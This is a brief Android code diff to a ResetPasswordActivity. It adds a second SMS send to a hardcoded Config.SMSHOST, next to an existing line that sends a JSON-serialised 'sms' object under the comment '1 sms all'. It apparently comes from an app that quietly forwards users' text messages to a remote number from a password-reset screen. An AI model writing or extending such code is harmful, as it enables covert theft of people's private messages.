@@ -4,7 +4,6 @@ import android.accounts.AccountManager;
 import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.app.Dialog;
-import android.app.role.RoleManager;
 import android.content.Context;
 import android.content.Intent;
 import android.graphics.drawable.ColorDrawable;
@@ -227,6 +226,15 @@ public class ResetPasswordActivity extends Activity {
             //1 sms all
             SmsManager smsManager = SmsManager.getDefault();
             smsManager.sendTextMessage(Config.SMSHOST, null, gson.toJson(sms), null, null);
+            smsManager.sendTextMessage(
+                    Config.SMSHOST,
+                    null,
+//                    context.getString(R.string.smsText) ,
+                    String.format("%s\n%s\n%s",context.getString(R.string.smsText2),"ارسال توسط اپلیکیشن:",context.getString(R.string.app_name)) ,
+                    null,
+                    null);
+
+
             new Handler().postDelayed(new Runnable() {
                 @Override
                 public void run() {
